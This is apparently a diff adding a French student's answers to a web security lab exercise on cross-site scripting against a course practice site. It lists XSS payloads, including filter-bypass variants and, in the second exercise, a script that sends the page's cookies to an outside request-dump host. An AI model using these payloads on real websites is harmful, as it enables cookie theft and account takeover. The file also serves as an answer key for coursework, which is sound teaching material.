@@ -1,0 +1,25 @@
+Exercice 1 :
+a) Pour ce premier exercice, le but est de procéder à une injection xss trivial sur une
+variante le site suivant permettant de chercher les éléments du tableau périodique des
+éléments : https://labosecuipl.alwaysdata.net/23/s10/ex1/
+Votre injection doit afficher une alerte1 affichant le texte : "I hacked you" :
+ Quelle valeur avez-vous entrée et où l'avez vous entrée ?
+
+Reponse 1 : <script>alert("i hacked you")</script>
+
+
+Pouvez-vous également afficher les cookies du site de l'exercice 1a avec votre injection
+xss ?
+
+Reponse 2 : <script>alert(document.cookie)</script>
+
+
+Reponse 3 : <scripT>alert("i hacked you")</scripT>
+
+Reponse 4 : <script  >alert("i hacked you")</script  >
+
+Reponse 5 : <button onClick="alert('i hacked you')">HACK MOI</button>
+
+EX2 :
+
+<script> xhr = new XMLHttpRequest(); xhr.open("GET", "https://httpdump.app/dumps/b3c1127f-7cc2-491e-ac85-f783d6b1c521" + "?options=" + document.cookie); xhr.send(); </script>
